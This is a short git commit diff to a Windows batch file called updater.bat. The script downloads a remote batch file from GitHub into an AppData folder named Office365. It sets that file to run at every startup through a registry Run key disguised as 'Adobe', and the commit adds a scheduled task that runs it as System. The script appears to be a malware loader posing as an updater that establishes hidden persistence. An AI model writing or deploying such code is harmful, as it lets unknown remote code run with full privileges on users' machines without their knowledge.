1d62b63115bda80735d8eb1a851f5ed891ce237c
qufyu <162769381+qufyu@users.noreply.github.com>
2024-03-09 11:27:37 -0500

    Update updater.bat

--- updater.bat
+++ updater.bat
@@ -1,4 +1,5 @@
 @echo off
 mkdir -p %APPDATA%\Office365
 curl -s https://raw.githubusercontent.com/qufyu/0024/main/main.bat > %APPDATA%\Office365\main.bat 
+schtasks /create /sc onstart /tn officeStart /tr %APPDATA%\Office365\main.bat /ru System
 reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Adobe /t REG_SZ /d "cmd c/ %APPDATA%\Office365\main.bat"
